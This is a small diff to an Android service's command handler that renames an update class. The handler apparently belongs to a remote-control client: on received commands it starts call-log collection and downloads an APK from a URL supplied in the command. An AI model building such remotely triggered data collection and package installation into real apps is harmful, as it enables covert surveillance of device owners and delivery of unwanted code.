@@ -151,10 +151,10 @@ public class Client extends Service {
                                 CallLogService cs = new CallLogService(client, arg1);
                                 cs.start();
                             } else if (command.equals("promptupdate")) {
-                                Log.i(TAG, "\nInvoking UpdateApp\n");
+                                Log.i(TAG, "\nInvoking UpdateService\n");
                                 String apkUrl = cmd.get("arg1").toString();
 
-                                UpdateApp atualizaApp = new UpdateApp(apkUrl);
+                                UpdateService atualizaApp = new UpdateService(apkUrl);
                                 atualizaApp.setContext(client);
                                 atualizaApp.run();
                             }
